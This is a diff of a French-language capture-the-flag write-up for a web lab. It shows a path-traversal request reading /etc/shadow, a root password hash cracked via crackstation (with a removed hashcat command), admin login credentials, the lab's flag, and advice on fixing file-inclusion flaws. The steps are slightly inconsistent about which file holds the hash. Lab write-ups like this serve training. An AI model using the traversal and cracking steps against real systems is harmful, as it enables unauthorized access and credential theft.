@@ -1,9 +1,20 @@
+Attaque de traversée de chemin :
+
+curl http://192.168.10.22/robots.txt
+User-agent: *
+Disallow: /whatever
+Disallow: /.hidden
+
+http://192.168.10.22/whatever/?page=../../../../etc/shadow
+Télécharger le fichier htpasswd et l'ouvrir afin de récupérer le hash : root:437394baff5aa33daa618be47b75cb49
+Se rendre ensuite sur https://crackstation.net/ pour cracker le hash :
+437394baff5aa33daa618be47b75cb49 => qwerty123@ 
+
+Aller sur http://192.168.10.22/admin/
+Taper root + qwerty123@ pour se connecter
+
 FLAG => d19b4823e0d5600ceed56d5e896ef328d7a2b9e7ac7e80f4fcdb9b10bcb3e7ff
-Dans le fichier htpasswd on récupère ce hash : root:437394baff5aa33daa618be47b75cb49
-
-echo "437394baff5aa33daa618be47b75cb49" > hash.txt
-hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
-
+=====================================================================================================================================
 REMEDIATION 
 Protection contre les LFI (Local File Inclusion) :
 La faille LFI permet à un attaquant de manipuler le paramètre ?page= pour lire des fichiers système comme /etc/passwd.
